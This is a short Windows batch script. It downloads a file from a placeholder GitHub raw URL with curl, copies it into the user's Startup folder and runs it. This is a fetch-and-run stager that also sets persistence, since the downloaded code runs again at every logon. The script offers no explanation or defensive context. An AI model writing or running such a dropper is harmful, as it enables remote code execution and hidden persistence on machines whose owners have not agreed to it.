@echo off

set url=YOUR_GITHUB_RAW_URL
set outputFile=script.bat
set startupFolder="%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

curl -o %outputFile% %url%
copy %outputFile% %startupFolder%

call %startupFolder%\%outputFile%
